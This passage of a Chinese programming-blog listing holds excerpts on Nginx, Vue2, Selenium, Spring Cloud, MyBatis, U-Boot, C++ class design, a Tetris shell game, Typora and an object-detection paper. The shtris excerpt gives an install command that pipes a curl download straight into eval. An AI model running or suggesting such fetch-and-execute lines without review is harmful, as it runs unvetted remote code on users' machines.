但此时对于客户端而言，他去访问这个地址就是固定的，才不会去管那个服务端有时间，你只要给我返回出数据就行，所以我们就需要一个管理者，将这些服务端找个老大过来，客户端直接找老大，再由老大分配谁处理谁的数据，从而减轻服务端的压力，而这个老大就是我们的Nginx反向代理服务器
有了负载均衡，流程就会变为如下图 不一定是每台机器都处理5个，要根据具体的请求数量和负载均衡算法来讨论，这里就是单纯的给个事例的例子
4.Nginx实现动静分离 我们应该如何理解什么是动态资源，什么是静态资源呢？
静态资源：就拿前端来说，写一个html页面，没有发起任何请求，不管用户操作多少次，始终是这个html页面，页面数据没有任何变化
动态资源：当html页面有进行向后端发送请求，每次返回的数据都不一样的，这种就叫做动态资源，根据你的具体请求，动态返回数据
当客户端通过浏览器发起请求的时候，没有实现动静分离的话，情况是这样的 可用把动态资源和静态资源在一起的这个框框理解为我们Java中的Tomcat，还记得可以将静态资源放在static下吗？
当Nginx访问静态资源的时候，先访问的是你后端的Tomcat，然后由Tomcat来访问静态资源
当实现了动静分离后，就会变成 当我们有了Nginx后，不需要将前端的静态页面放到static了，直接交给Nginx进行处理，当访问静态资源的时候，直接由Nginx进行访问,无需经过Tomcat。
总结 以上是我对Nginx的一些理解，如果大家在Nginx的使用的时候遇到了问题，特别是用Docker搭Nginx时出现问题
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/b6ea6c484fc5d74310a23dd4b402500b/" rel="bookmark">
			Vue2通用后台管理项目笔记-axios,ajax,element-ui,vuex,vue-router
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		文章目录 Vue2通用后台管理项目笔记1.vue-cli搭建项目2.element-ui使用1.安装2.引入 3.Vue-router使用1.安装2.配置①创建路由组件②将组件和路由进行一个映射③创建router实例④对外暴露router实例 3.嵌套路由介绍 4.整体ui设计1.整体布局 2.Aside左侧菜单栏引入2.1一二级菜单数据分类2.2一级菜单实现2.3二级菜单实现 5.菜单点击跳转功能实现（路由跳转）和重定向5.5.点击相同路由报错6.Header组件搭建与调整7.vuex实现左侧折叠8.左侧菜单遗留问题解决9.Home组件布局①左侧上部设计②购买统计部分③右侧订单统计部分④右侧中间和下方表格部分（1）echarts的基本使用 （2）三个数据图的代码 10.面包屑数据处理11.tag功能①.tag的点击与删除 12.用户管理页面功能&amp;form①form页面编写②form新增功能编写③table数据的展示④table数据的渲染⑤新增、编辑、提交功能编写⑥列表分页功能⑦搜索功能 13.权限管理①登录界面②登录权限和导航守卫 14.登录接口逻辑实现15.菜单权限管理 Vue2通用后台管理项目笔记 视频网址：https://www.bilibili.com/video/BV1QU4y1E7qo/?spm_id_from=333.1007.top_right_bar_window_custom_collection.content.click&amp;vd_source=05357abb73955e1d5683092c544c1376
刚学完vue，感觉对于很多东西还不是很理解，但也没有时间去再复习，所以打算直接上手一个实战项目来边写边练，之前学的时候由于有别人现成的笔记，导致我很多时候都会有图轻松的想法，一直没有自己动手做过笔记，我也发现这样的做法导致我对学的东西一学就忘，很难在脑中留下深刻的印象，所以我觉得这次做项目要自己纯手敲笔记，保证每一个需求都在完成之后留下当时的想法。2023-12.20
1.vue-cli搭建项目 当我们要创建一个项目的时候，里面有很多诸如api、store等需要按照固定规定完成的文件夹，如果交由程序员自己一点一点创建，过于繁琐，于是我们引入脚手架（vue-cli）的概念
官网：https://cli.vuejs.org/zh/guide/
启动脚手架之前需要先安装node，node可以理解成是一种环境
官网：https://nodejs.org/en
首先需要安装vue-cli，这里直接使用命令行的方式
npm install -g @vue/cli # OR yarn global add @vue/cli 安装完可以在命令行里输入vue -V,来检测是否成功安装
​
安装完之后就可以在你想要创建项目的文件夹中打开cmd，输入vue create 项目名来创建项目
创建完后可以使用npm run server来启动项目
2.element-ui使用 官网：https://element.eleme.cn/#/zh-CN
element-ui可以快速的帮助我们生成页面上的样式以及布局
1.安装 在刚才创建好的项目中安装elemeng-ui
命令行输入：npm i element-ui -S即可
安装完毕后可以在package.json文件中查看是否安装完成
如图便是安装完成了
2.引入 ①完整引入
在 main.js 中写入以下内容：
import Vue from 'vue'; //引入element-ui import ElementUI from 'element-ui'; import 'element-ui/lib/theme-chalk/index.css'; import App from '.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/b6ea6c484fc5d74310a23dd4b402500b/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/728b9b820afac4cc26b5ee58e6709427/" rel="bookmark">
			自动化测试——selenium工具（web自动化测试）
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		1、自动化测试 优点：通过自动化测试有效减少人力的投入，同时提高了测试的质量和效率。
也用于回归测试。随着版本越来越多，版本回归的压力越来越大，仅仅通过人工测试 来回归所以的版本肯定是不现实的，所以我们需要借助自动化测试。
2、自动化测试的分类 接口自动化测试
UI自动化测试（界面测试）：
移动端自动化测试
web端自动化测试
3、selenium（web自动化测试工具） 为什么选择selenium作为我们的web自动化测试工具？ 答：1）开源免费
2）支持多浏览器。如：Chrome、Firefox、IE浏览器等等
3）支持多系统。如：Linux、Windows、MacOS.....
4）支持多语言。如：Java、Python、CSharp、Ruby、JavaScript、Kotlin
5）selenium包里提供了很多可供测试使用的API。
4、环境部署 使用selenium实施web自动化测试，需要的环境有：
Chrome浏览器谷歌驱动（ChromeDriver）selenium工具包 一个简单的自动化代码示例：
首先导入selenium包：
&lt;dependency&gt; &lt;groupId&gt;org.seleniumhq.selenium&lt;/groupId&gt; &lt;artifactId&gt;selenium-java&lt;/artifactId&gt; &lt;version&gt;4.0.0&lt;/version&gt; &lt;/dependency&gt; 简单自动化百度搜索蔡徐坤代码：
public void caixukunTest() throws InterruptedException { //打开浏览器 ChromeDriver driver = new ChromeDriver(); Thread.sleep(2000); //在浏览器输入百度网址，访问百度网页 driver.get("https://www.baidu.com"); Thread.sleep(2000); //找到百度首页的输入框元素，输入关键词 蔡徐坤 driver.findElement(By.cssSelector("#kw")).sendKeys("蔡徐坤"); Thread.sleep(2000); //找到百度首页”百度一下“按钮，并点击 driver.findElement(By.cssSelector("#su")).click(); Thread.sleep(2000); //结束会话（关闭浏览器） driver.quit(); } 简单自动化实例的五个主要步骤：
创建驱动实例，创建会话访问网站查找元素操作元素结束会话 5、selenium常用方法 5.1 查找页面元素 findElement（）
参数：By类（提供什么方式来查找元素）
返回值：webElement
findElements（）
参数：By类（提供什么方式来查找元素）
返回值：List&lt;WebElement&gt;
5.2 元素的定位 By类 selector：基础选择器/复合选择器
功能：选中页面中指定的标签元素
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/728b9b820afac4cc26b5ee58e6709427/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/7f97c507cd5965b099278bdc827be228/" rel="bookmark">
			简单介绍----微服务和Spring Cloud
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		 微服务和SpringCloud 1.什么是微服务？ 微服务是将一个大型的、单一的应用程序拆分成多个小型服务，每个服务负责实现特定的业务功能，并且可以通过网络通信与其他服务通信。微服务的优点是开发更灵活（不同的微服务可以使用不同的开发语言）、并且更容易维护、更好的可伸缩性和可用性更高，以及更好的团队协作。
2.什么是SpringCloud SpringCloud是一个用于构建分布式系统和微服务架构的开发工具的集合。它基于Spring Framework，为开发人员提供了一套简化分布式系统开发的解决方案。
SpringCloud提供了一系列的组件和库，用于实现分布式系统的常见模式和功能，包括服务注册与发现、负载均衡、断路器、配置管理、消息总线、分布式追踪、网关等等。它简化了在构建分布式系统时所需的开发工作，并提供了一致而可靠的开发模式。
我把最后一句话换句简单的话说：上述黑体字都是一个个小零件，SpringCloud相当于一个大容器，现在我把这些小零件都放进这些容器里了，等你想做分布式开发的时候，你直接把这些小零件拿出来用就行了，就不用再费事的去建造这些小零件了。
通过使用SpringCloud，开发人员可以快速构建基于微服务架构的应用程序，并将各个微服务协调管理起来。这样，每个微服务可以根据自身的需求独立开发，部署和扩展，通过服务间的调用和协作来实现整体功能。
3.微服务和SpringCloud 微服务是一种架构思想，而SpringCloud是对于微服务实现的一种规范，当然很多地方也把SpringCloud用来代指微服务，但是二者是不同的，前者是思想，后者是规范。
比如，我是个老板，我现在想吃红烧肉，我手下有10个厨子，我让他们都要去做红烧肉，并且每个人的红烧肉这道菜都需要加糖，至于别的想加什么就加什么，好吃就行。
在这里，我想吃红烧肉就是思想，必须加糖就是规范。
而SpringCloud里面有这些组件，这些组件就相当于是规范，也就是说，你这个程序员要想实现微服务这样的效果，就必须使用我这些组件，然后你怎么用就是你自己的事了
4.微服务存在的意义 1.架构趋势：微服务架构是当今软件开发的一种主流趋势。它允许将应用程序拆分成一系列较小的，自治的服务，每个服务都可以独立部署、扩展和维护。java程序员学习微服务可以使他们跟上技术潮流，提高就业竞争力。
2.弹性和扩展性：微服务架构允许应用程序根据需求进行高度弹性和可伸缩的扩展。java程序员可以使用微服务来构建具有高可用性和弹性需求的应用程序。
3.独立性和自治性：微服务架构中的每个服务都是独立的，可以单独开发、测试、部署和维护。这使得java程序员能过更加高效的开发和维护应用程序。
其中第二点可能有点难懂，让我来举个例子
假设我们有一个电子商务平台，该平台包括商品浏览、用户账户管理、订单处理、支付处理和库存管理等功能。
传统单体架构：
在单体架构中，所有这些功能都会被集成在一个大型应用程序中。这意味着任何对系统的小修改都可能需要重新部署整个应用程序。此外，如果需要扩展特定功能（如订单处理），可能需要扩展整个应用程序，这可能不是最有效率和成本效益的方法。
转变为微服务架构：
在微服务架构中，每个功能（商品浏览、用户账户管理、订单处理等）都作为一个独立的服务构建。这些服务独立部署和运行，通过轻量级通信机制（如HTTP REST API）相互协作。
例子：
弹性：假设黑色星期五来临，平台的订单量剧增。在微服务架构中，可以单独针对订单处理服务进行扩展，增加更多订单处理的服务实例来应对高峰期的流量，而不影响其他服务，如商品浏览或用户账户管理。
可伸缩性：如果分析发现商品浏览服务的使用率相对较低，可以减少该服务的资源分配，将资源重新分配给更需要的服务（如订单处理服务），从而优化资源使用和成本效率。
高可用性：如果支付处理服务出现问题，它不会影响到平台的其他服务。用户仍然可以浏览商品和管理他们的账户，直到支付服务恢复正常。
通过这种方式，微服务架构使得应用程序能够根据每个服务的需求进行高度弹性和可伸缩的扩展，同时保持整个系统的高可用性。
5.SpringCloud组件（现在基本都在用第二代了） 
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/504d2aaaf7e195d6ffcd99c2eff40a73/" rel="bookmark">
			Spring整合MyBatis详细分析
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		mybatis-spring官网
这里我们以传统的spring为例，因为配置更为直观，在spring中使用注解的效果是一样的。
我们在其它几篇文章中已经介绍了MyBatis的工作流程、核心模块和底层原理。了解了MyBatis的原生API里面有三个核心对象:
SqlSessionFactory、SqlSession和MapperProxy
大部分时候我们不会在项目中单独使用MyBatis的工程，而是集成到Spring中使用，但是却没有看到这三个对象在代码里面出现。我们都是直接注入一个Mapper接口，然后调用Mapper接口的方法。所以有下面几个问题，我们要弄清楚：
SqlSessionFactory是什么时候创建的SqlSession去哪里了？为什么不用它来获取Mapper?为什么@Autowired注入一个接口，在使用的时候却变成了一个代理对象？在IOC的容器里面我们注入的是什么？注入的时候发生了什么事情？ 下面，先看一下把MyBatis集成到Spring中要做的几件事：
除了MyBatis的依赖之外，我们还需要在pom中添加MyBatis和Spring整合的依赖 &lt;dependency&gt; &lt;groupId&gt;org.mybatis&lt;/groupId&gt; &lt;artifactId&gt;mybatis-spring&lt;/artifactId&gt; &lt;version&gt;2.0.0&lt;/version&gt; &lt;/dependency&gt; 在Spring的applicationContext.xml中配置SqlSessionFactoryBean，它是用来帮助我们创建会话的，其中还要指定全局配置文件和mapper映射器文件的路径 &lt;!-- 在Spring启动时创建 sqlSessionFactory --&gt; &lt;bean id="sqlSessionFactory" class="org.mybatis.spring.SqlSessionFactoryBean"&gt; &lt;property name="configLocation" value="classpath:mybatis-config.xml"&gt;&lt;/property&gt; &lt;property name="mapperLocations" value="classpath:mapper/*.xml"&gt;&lt;/property&gt; &lt;property name="dataSource" ref="dataSource"/&gt; &lt;/bean&gt; 然后在applicationContext.xml中配置需要扫描Mapper接口的路径：
在MyBatis中有几种方式，第一种是配置一个MapperScannerConfigurer，第二种是使用scan标签 &lt;!--配置扫描器，将mybatis的接口实现加入到 IOC容器中 --&gt; &lt;!-- &lt;mybatis-spring:scan #base-package="com.yrk.dao"/&gt; --&gt; &lt;bean id="mapperScanner" class="org.mybatis.spring.mapper.MapperScannerConfigurer"&gt; &lt;property name="basePackage" value="com.yrk.dao"/&gt; &lt;/bean&gt; 还有一种是使用注解@MapperScan，比如我们在springboot的启动类上加上一个注解
@SpringBootApplication @MapperScan("com.yrk.mybatis") public class MyBatisAnnotationApplication { /** * @param args */ public static void main(String[] args) { SpringApplication.run(MyBatisAnnotationApplication.class, args); } } 创建会话工厂
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/504d2aaaf7e195d6ffcd99c2eff40a73/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/1885a10fadf91f93d1e78eb58812f2fa/" rel="bookmark">
			Hotkey-RK按键进入uboot一些功能
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		RK平台提供串口组合键触发一些事件用于调试、烧写（如果无法触发，请多尝试几次；启用secureboot时无效）。开机时长按： ctrl+c：进入 U-Boot 命令行模式； ctrl+d：进入 loader 烧写模式； ctrl+b：进入 maskrom 烧写模式； ctrl+f：进入 fastboot 模式； ctrl+m：打印 bidram/system 信息； ctrl+i：使能内核 initcall_debug； ctrl+p：打印 cmdline 信息； ctrl+s："Starting kernel..."之后进入 U-Boot 命令行； Make.sh make.sh 既是一个编译脚本，也是一个打包、调试工具。可用于反汇编、打包固件。 // 帮助命令 ./make.sh --help // 打包固件的功能 ./make.sh trust // 打包trust ./make.sh loader // 打包loader ./make.sh trust &lt;ini-file&gt; // 打包trust时指定ini文件 ./make.sh loader &lt;ini-file&gt; // 打包loader时指定ini文件 ./make.sh spl // 用tpl+spl替换ddr和miniloader，打包成loader ./make.sh spl-s // 用spl替换miniloader，打包成loader ./make.sh itb // 打包u-boot.itb（64位平台只支持打包ATF和U-Boot，OP-TEE 不打包） ./make.sh env // 生成fw_printenv工具 // 反汇编的功能 .
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/1885a10fadf91f93d1e78eb58812f2fa/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/90c93b956b70cd17ec069984f8b7de9c/" rel="bookmark">
			特殊类的设计
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		文章目录 设计一个不能被拷贝的类设计一个只能在堆上创建对象的类设计一个只能在栈上创建对象的类不能被继承的类设计模式 正文开始前给大家推荐个网站，前些天发现了一个巨牛的 人工智能学习网站， 通俗易懂，风趣幽默，忍不住分享一下给大家。 点击跳转到网站。 设计一个不能被拷贝的类 拷贝只会放生在两个场景中：拷贝构造函数以及赋值运算符重载，因此想要让一个类禁止拷贝，只需让该类不能调用拷贝构造函数以及赋值运算符重载即可。
C++98中可以将拷贝构造和赋值重载私有化即可。
class copyban { public: //... private: copyban(const copyban&amp; c); copyban&amp; operator+(const copyban&amp; c); //... }; 设置成私有：如果只声明没有设置成private，用户自己如果在类外定义了，就可以不能禁止拷贝了只声明不定义：不定义是因为该函数根本不会调用，定义了其实也没有什么意义，不写反而还简单，而且如果定义了就不会防止成员函数内部拷贝了。 C++11中可以直接把拷贝构造和赋值重载禁止生成。
class copyban { public: //... copyban(const copyban&amp; c) = delete; copyban&amp; operator+(const copyban&amp; c) = delete; private: //... }; 设计一个只能在堆上创建对象的类 将类的构造函数私有，拷贝构造声明成私有。防止别人调用拷贝在栈上生成对象。提供一个静态的成员函数，在该静态成员函数中完成堆对象的创建 class HeapOnly { public: static HeapOnly* CreateObject() { return new HeapOnly; } private: HeapOnly() {} // C++98 // 1.只声明,不实现。因为实现可能会很麻烦，而你本身不需要 // 2.声明成私有 HeapOnly(const HeapOnly&amp;); // or // C++11 HeapOnly(const HeapOnly&amp;) = delete; }; 也可以将析构函数给私有化，拷贝构造仍然需要禁用。
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/90c93b956b70cd17ec069984f8b7de9c/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/a6bcd9f9c01f4c662206af399d9073b9/" rel="bookmark">
			java编写的窗体版本销售管理系统(客户关系管理系统) 、功能完善 代码齐全
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		年底了公司的事情特别，晚上一到家后基本就躺床上睡着了，很长一段时间没有更新博客信息。今天稍微空了点，继续为为大家介绍一个入门级的窗体项目:销售管理系统(客户关系管理系统)project121.今天要介绍的销售管理系统分三类用户：顾客、客户经理（员工)、系统管理员。顾客的主要功能包括：查看自己购买的商品信息、在线投诉、查看投诉处理进展；客户经理（员工)的主要功能包括：录入销售订单、处理用户投诉。系统管理员的主要功能包括：顾客管理、用户管理、产品管理、销售管理、反馈管理。系统功能不是很复杂，但是涉及到数据库技术、UI技术、多线程技术、文件技术等，是一个实战性很强的项目。目前系统功能已经很全面，后续会进一步完善。整个系统界面漂亮，有完整得源码，希望大家可以喜欢。喜欢的帮忙点赞和关注。一起编程、一起进步。
开发环境 开发语言为Java，开发环境Eclipse或者IDEA都可以。数据库采用：MySQL。运行主程序，或者执行打开JAR文件即可以运行本程序。
系统框架 利用JDK自带的SWING框架开发，不需要安装第三方JAR包。MySQL数据库，纯窗体模式，直接运行Main文件即可以。
系统功能 销售管理系统分三类用户：顾客、客户经理（员工)、系统管理员。顾客的主要功能包括：查看自己购买的商品信息、在线投诉、查看投诉处理进展；客户经理（员工)的主要功能包括：录入销售订单、处理用户投诉。系统管理员的主要功能包括：顾客管理、用户管理、产品管理、销售管理、反馈管理。功能用功能表示如下：
运行效果 1 用户登陆 2 客户管理 3 员工管理 4 产品管理 5 销售管理 6 反馈管理 7 员工销售清单 8 顾客查看购买记录 项目总结 （1）在写代码之前，在大脑里一定要把思路理清楚，不能模模糊糊，一定要把功能图和流程图画出来，然后根据它去实现每一个功能块，要多分析，培养一种良好的逻辑思维能力。
（2）在写代码的过程中，一定要采取就近原则，同一个功能，或者对同一个组件的设置一般要写在一块，这样写的程序比较清晰，不容易出错，也便于查找。
（3）要养成良好的注释习惯，一是有利于别人阅读你的程序，同时也有利于自己以后再看，就能很快的读懂程序，提高效率。
（4）把功能模块化，即把实现相同功能的代码段封装成一到一个类或者一个方法中，实现的时候调用即可，这样能提高代码的可读性
（5）养成创建包来存放不同功能的类，使系统的结构更加模块化和规范化。
（6)在编写代码的时候，一定要边写边调试，要适时的设置断点，或者把某些变量的值输出到控制台，通过观察和分析变量的值，便于判断问题所在，同时，需要捕获异常的一定要把异常信息打印出来，便于分析问题。
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/90e539302c01dd05a74baaca077199c3/" rel="bookmark">
			x-cmd pkg | shtris - 命令行俄罗斯方块游戏
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		 目录 简介首次用户技术特点竞品和相关作品进一步阅读 简介 shtris 是一个由 shell 脚本，参考 俄罗斯方块指南 (2009) 实现的俄罗斯方块游戏。
首次用户 使用 x shtris 即可自动下载并使用
在终端运行 eval "$(curl https://get.x-cmd.com)" 即可完成 x 命令安装, 详情参考 x-cmd 官网 x-cmd 提供1分钟教程，其中包含了 shtris 命令常用功能的 demo 示例，可以帮你快速上手 shtris 。
使用案例:
# 在命令行中开始俄罗斯方块游戏 x shtris 技术特点 功能丰富：支持保持队列、下一个队列、随机生成、得分系统、T-Spin/Mini T-Spin、Back-to-Back Bonus、Extended Placement/Infinite Placement/Classic Lock Down、Super/Classic Rotation System和更改起始级别等功能。可跨平台运行：支持 Linux、FreeBSD、BusyBox 和 Solaris 等 shell 环境。 竞品和相关作品 dkorolev/bash-tetris 由 bash 实现的俄罗斯方块游戏脚本。
进一步阅读 shtris 源代码 - shtris 项目的源代码托管在 GitHub，你可以在这里找到最新版本的 shtris 和参与社区贡献。Wikipedia: Tetrisshtris - ShellScript 
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/a8ae19caf8cf8bb86e6fe397362b9691/" rel="bookmark">
			Typora 无法导出 pdf 问题的解决
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		目录
问题描述
解决困难
解决方法
问题描述 我的 Windows 下，以前（Windows 11） Typora 可以顺利较快地由 .md 导出 .pdf 文件，此功能当然非常实用与重要。
然而，有一次电脑因故重装了系统（刷机），并且装的是 Windows 10。重新安装 Typora，而后发现其无法导出 pdf，正常操作后会弹出类似 “Failed to ... Undefined” 的提示，其实同时也发现图像亦无法导出。
解决困难 官方帮助文档似乎没用网上稍简略一点的教程都没用，其中大多数都是解决打印服务的问题，其调整以下的服务： 但我的该服务上本就是正确设置的。 网上有人 “另辟蹊径”：先导出 .html 文件，再在浏览器中 “打印” 并选择保存，从而得到 pdf。此法能解决主要问题，但其有一弊端：从 Typora 中导出 pdf 则会根据文件中的各级标题相应地生成 pdf 的 “书签”（即阅读器侧栏的目录），而从浏览器打印保存 html 是没有这样的效果的。这可能会带来不便，也会让阅读者感到奇怪。 解决方法 首先，说不定 Windows 将升级回 Windows 11 可以解决问题，不过可能比较麻烦。
将 Typora 更新到最新版本（1.18, 2024年1月推出）就好了！
或许上述问题就属于被修复的 “other bug” 吧……
令人欣慰的是，这个新版本导出 pdf 的速度也比之前快了不少~
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/15590cf84cea6a0f346aa6a250c41fa8/" rel="bookmark">
			Image Enhancement Guided Object Detection in Visually Degraded Scenes
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		 Abstract 目标检测准确率在视觉退化场景下降严重。一个普遍的解决方法就是对退化图像进行增强然后再执行目标检测。但是，这是一种次优的方案，而且未必对目标检测的准确率有提升，因为图像增强和目标检测两个任务的不同。为了解决这个问题，我们提出了一种图像增强引导目标检测的方法，以端到端的方式定义了一个检测网络和一个额外的增强分支。具体来说，增强分支和检测分支以并行的方式组织，并设计了一个特征引导模块来连接这两个分支，这优化了检测分支中输入图像的浅层特征，使其与增强图像的浅部特征尽可能一致。由于增强分支在训练过程中被冻结，这样的设计起到了利用增强图像的特征来指导对象检测分支的学习的作用，从而使学习到的检测分支同时意识到图像质量和对象检测。测试时，删除了增强分支和特征引导模块，因此检测不需要额外的计算成本。
Introduction 通常，有三种方法可以将图像增强和目标检测任务结合在神经网络中。
首先训练图像增强网络，然后将增强后的图像作为输入来训练检测网络。第二个以端到端的方式级联增强网络和检测网络第三部分考虑了本文提出的两种网络并行方式。三种不同组合方式的流程图如图1所示。
对于第一种方法：已经被证明，增强后的图像并不能总是导致高级视觉任务的效果提升，例如目标检测，因为这两个独立任务的目标不同。
更多的努力在于第二种方式，将两个任务集成到端到端的网络中，并联合优化增强网络和目标检测网络。
我们提出了一种图像增强指导目标检测的方法来提高视觉退化场景的检测性能。它由三部分组成：一个图像增强分支、一个检测分支、一个特征指导模块。更具体地说，前两个分支是以并行的方式组织的，第三个模块被设计为通过约束增强图像的低级别特征图与检测分支产生的特征图之间的一致性来桥接这两个分支，因为低级别特征图包含更多细节。尽管DSNet[17]中也采用了并行方式，但我们的方法与DSNet有很大的不同。首先，DSNet只面向模糊对象检测，而我们的方法更灵活，可以通过在我们的框架中选择不同的图像增强分支来适应不同的场景。其次，DSNet的两个子网共享用于对象分类和对象定位的公共块模块，而我们的方法使用一致性损失来约束检测分支进行训练。 本文主要贡献如下：
提出了一种新的框架用于视觉退化场景的目标检测。设计了一个特征引导模块，通过强制其特征图与增强分支的特征图一致，提高检测分支本身的性能，使检测分支学习更多信息特征。在测试阶段，只需要检测分支，并且不引入额外的计算成本。在2021年水下机器人采摘大赛（URPC2021）、1 ChinaMM[27]、RTTS[28]、LLVIP[29]和ExDark[30]上的大量实验表明，与原始网络相比，我们的增强引导检测网络可以显著提高性能。据我们所知，这是第一次用通用框架来处理这三种视觉退化场景（水下、朦胧和微光场景）中的物体检测。 Method 原始图像I作为E和D的输入。然后浅层特征FI作为G的输入。IE通过下采样操作得到IE’，IE’的尺寸将与FI一样，由于增强分支的参数在训练过程中是固定的，IE’因此保持不变，在Lc的损失下，FI将倾向于IE’，Lc测量IE’'和FI’的相似性。我们固定了增强分支的参数，以防止它被检测分支同化，因此可以使检测分支学到更多目标细节。我们强调，尽管增强分支E可以生成清晰的图像，但我们的目的是监督检测分支学习更好的特征表示，用于对象定位和分类。
Overview of the Method 针对缺乏处理视觉退化场景中对象检测的通用框架的问题，我们提出了一种模块化网络设计方法，该方法由检测分支、增强分支和特征引导模块组成。前两个分支以并行的方式组织，第三个分支用于引导检测分支的低层学习对象的丢失细节。由于在视觉退化场景下获得的对象的特征退化，如何更好地提取低级别特征对于检测很重要，一些工作[17]，[55]对此进行了研究，其中将增强图像中的特征输入到以下检测分支。为了提高检测网络提取特征的能力，本文使用图像增强的特征作为指导，并且使检测分支的低级特征图倾向于图像增强。由于物体的特征在增强图像中引人注目，该指导可以强制检测分支学习物体的更详细信息，从而提高视觉退化场景中的检测性能。应该注意的是，在不增加网络计算成本的情况下，在测试阶段删除了增强分支和特征引导模块。
Detection Branch 对于在不利条件下拍摄的图像，对象的特征通常会退化或淹没在背景中，使对象从一开始就被网络忽略。因此，提升检测性能，增强特征提取能力是至关重要的，尤其是对于底部卷积层。如图2所示，以YOLOv3为检测分支的例子，对浅DBL层的特征图进行了细化，它由三个部分组成：卷积层、批量归一化层和RELU激活。输出的特征图FI流到两个地方：特征引导模块G和以下检测网络。输出特征图流向两个地方：特征指导模块G和检测网络。对于提出的指导模块G，FI会倾向于IE’。同时，这些明显的特征被传播到下面的检测分支，从而提高了最终的检测性能。
Enhancement Branch 增强分支实际上是一个预训练的图像增强模型，它输入原始图像并输出增强图像，并且应该根据所研究的成像场景进行选择。也就是说，对于水下目标检测，选择水下图像增强网络作为增强分支，对于雾天条件下的目标检测，考虑去雾模型。
这里，从增强模型输出增强图像而不是增强特征图主要基于以下两个考虑：
首先，在不知道其内部结构的情况下，整个增强网络可以很容易地作为黑匣子插入到我们的框架中，从而为将任何其他增强网络纳入我们的框架带来了灵活性，因此我们的方法可以用于各种视觉退化场景中的对象检测。其次，由于不同增强网络的多样性，很难选择合适的特征图来提供足够的引导信息。
例如，UIEC∧2-Net由两个具有不同角色的连续块组成，它们相互协作以输出最终结果。提取任一块的特征图可能会丢失有用的信息。即使由于数据间隙，使用增强图像来引导低级别特征图也是不可能的。
为了解决这种不匹配，提出了一种特征引导模块，并将在下文中进行描述。 Feature Guided Module 图2显示了特征引导模块的结构。有两个输入：增强图像IE和浅层特征图FI。然后，对于它们中的每一个，分别沿着通道轴进行最大池化和平均池化，以获得两个压缩的特征图。将这两个特征图连接起来，生成仅具有两个通道的特征描述符。沿通道轴应用池化操作可以有效地突出显示信息区域。我们相信，最大池和平均池操作可以使模块学习对象的主要特征。
Loss function 我们提出的方法的损失函数包含两个主要成分，检测损失Ldet和一致性损失Lc
测量F’I和I’'E的一致性损失函数MSE
λc设置为0.5
experiments Details batch size：4，没有使用数据增强，RTX3090，
DATASETS haze image datasets
在RTTS里抽了3673张图片作为训练集，保留649张图片作为测试集。
* 与微调方法YOLOv3相比，增强和检测任务的分离（Separate Way）降低了物体检测性能，尽管增强后的图像更符合人类的视觉感知。仅用于视觉增强的变化似乎干扰了检测网络的特征提取
级联方式（cascaded way）并没有带来显著的性能提升，许多指标，如AP0.75，甚至略有下降。同时，由于获得增强图像的额外过程，检测时间显著增加。对于并行方式（parallel way），在保持相同计算成本的同时，观察到显著的性能改进。在URPC2021中，与基线相关的mAP增加了3%（从42.3%增加到45.3%）。在RTTS上，获得了2.6%的增量（从47.4%到50.0%）。在LLVIP上，Parallel Way的AP0.5提高了2.4%，AP0.75提高了8.2%（从28.2%提高到36.4%）。 
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/29f77ca60c1473fefe44c6ddf633c8b7/" rel="bookmark">
			【Java 设计模式】行为型之模版方法模式
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		文章目录 1. 定义2. 应用场景3. 代码实现结语 模板方法模式（Template Method Pattern）是一种行为型设计模式，用于定义算法的框架，并将一些步骤的实现延迟到子类。模板方法模式通过定义一个算法骨架，将具体步骤的实现推迟到子类，使得子类可以在不改变算法结构的情况下重定义算法的某些步骤。在本文中，我们将深入研究Java中模板方法模式的定义、结构、使用场景以及如何在实际开发中应用。 1. 定义 模板方法模式是一种行为型设计模式，用于定义算法的框架，并将一些步骤的实现延迟到子类。模板方法模式通过定义一个算法骨架，将具体步骤的实现推迟到子类，使得子类可以在不改变算法结构的情况下重定义算法的某些步骤。模板方法模式通常包含两个主要角色：抽象模板（Abstract Template）和具体模板（Concrete Template）。
抽象模板（Abstract Template）： 定义了算法的骨架，包含一些抽象的步骤，将具体步骤的实现延迟到子类具体模板（Concrete Template）： 实现了抽象模板中的具体步骤，完成算法的实际实现 2. 应用场景 模板方法模式通常在以下场景中使用：
